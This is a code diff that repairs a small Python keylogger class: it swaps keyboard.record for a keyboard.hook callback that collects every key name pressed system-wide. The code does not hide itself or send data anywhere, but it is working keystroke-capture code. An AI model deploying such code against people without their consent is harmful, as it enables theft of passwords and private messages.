@@ -1,22 +1,19 @@
-from abc import abstractmethod, ABC
 import keyboard
 class KeyLoggerService:
     def __init__(self):
-        self.fleg = False
+        self.flag = False
         self.keys = []
 
+    def on_key_event(self, event):
+        self.keys.append(event.name)
 
-    @abstractmethod
     def start_logging(self)-> None:
-        self.keys = keyboard.record(until= self.fleg)
+        keyboard.hook(self.on_key_event)
 
-
-    @abstractmethod
     def stop_logging(self):
-        self.fleg = True
+        keyboard.unhook_all()
 
 
-    @abstractmethod
     def get_logged_keys(self) -> list:
         requested_keys = self.keys
         self.keys = []
